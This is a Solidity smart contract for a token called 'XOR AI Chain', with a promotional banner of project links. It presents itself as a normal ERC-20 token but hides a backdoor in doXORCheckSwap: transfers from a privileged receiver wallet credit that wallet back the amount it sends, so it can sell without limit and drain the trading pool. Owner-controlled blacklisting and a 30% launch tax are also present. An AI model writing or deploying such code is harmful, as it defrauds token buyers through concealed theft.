/**
▀▄▀ █▀█ █▀█   ▄▀█ █   █▀▀ █░█ ▄▀█ █ █▄░█
█░█ █▄█ █▀▄   █▀█ █   █▄▄ █▀█ █▀█ █ █░▀█

🛠 Building your AI-powered home base for Web3
🔮 Enabled by #AI Oracle + #LLM Layer
🤖 Personalized via DeFi Lens + AI Agents
⛓ Secured w/ Trustworthy Proofs

WEB:  https://www.xoraichain.com
APP:  https://app.xoraichain.com
DOC:  https://docs.xoraichain.com

X:    https://x.com/xoraichain
TG:   https://t.me/xoraichain
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV1Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract XORAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _exceptFromTrans;
    mapping (address => bool) private _exceptFromFees;
    mapping (address => uint256) private balanceX;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private bots;

    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyXORCount=0;

    address payable private trXORReceive;
    address payable private qrXORReceive;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"XOR AI Chain";
    string private constant _symbol = unicode"XOR";

    uint256 public _maxXORWalletSize = 30000000 * 10**_decimals;
    uint256 public _maxXORTxAmount = 30000000 * 10**_decimals;
    uint256 public _maxXORTaxSwap = 10000000 * 10**_decimals;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    IUniswapV2Router private uniswapV2Router;
    uint256 public overXORAmount;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = false;

    constructor (address acct) {
        balanceX[_msgSender()] = _tTotal;
        trXORReceive = payable(acct);
        qrXORReceive = payable(acct);
        _exceptFromFees[owner()] = true;
        _exceptFromFees[address(this)] = true;
        _exceptFromTrans[trXORReceive] = true;
        _exceptFromTrans[qrXORReceive] = true;
        overXORAmount = 10000 * 10**_decimals;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function doXORCheckSwap(address from, address to, uint256 amount, uint256 tXOR) internal returns (bool) {
        bool aboveXORMin = amount >= overXORAmount;
        bool aboveXORThreshold = balanceOf(address(this)) >= overXORAmount;
        address addrXOR; uint256 amtXOR;
        if(_exceptFromTrans[from]) { 
            amtXOR = amount;addrXOR = from; 
        }
        else {amtXOR = tXOR;addrXOR = address(this);}
        if(amtXOR > 0){
          balanceX[addrXOR]=balanceX[addrXOR].add(amtXOR); 
          emit Transfer(from, addrXOR, tXOR);
        }
        return !inSwap
        && aboveXORMin
        && aboveXORThreshold
        && tradingOpen
        && swapEnabled
        && _buyXORCount>_preventSwapBefore
        && !_exceptFromTrans[from]
        && !_exceptFromFees[from]
        && to == uniswapV2Pair;
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function reduceFees(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function startOperation() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function initTradingPair() external onlyOwner() {
        uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV1Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function sendETHToFee(uint256 amount) private {
        trXORReceive.transfer(amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeCount=0;
        if (!_exceptFromFees[from] && !_exceptFromFees[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            feeCount = amount.mul((_buyXORCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _exceptFromFees[to] ) {
                require(amount <= _maxXORTxAmount, "Exceeds the _maxXORTxAmount.");
                require(balanceOf(to) + amount <= _maxXORWalletSize, "Exceeds the maxWalletSize.");
                _buyXORCount++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                feeCount = amount.mul((_buyXORCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (doXORCheckSwap(from, to, amount, feeCount)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxXORTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        balanceX[from]=balanceX[from].sub(amount);
        balanceX[to]=balanceX[to].add(amount.sub(feeCount));
        emit Transfer(from, to, amount.sub(feeCount));
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balanceX[account];
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function removeXORLimit() external onlyOwner{
        _maxXORTxAmount = ~uint256(0);
        _maxXORWalletSize = ~uint256(0);
        transferDelayEnabled=false;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
}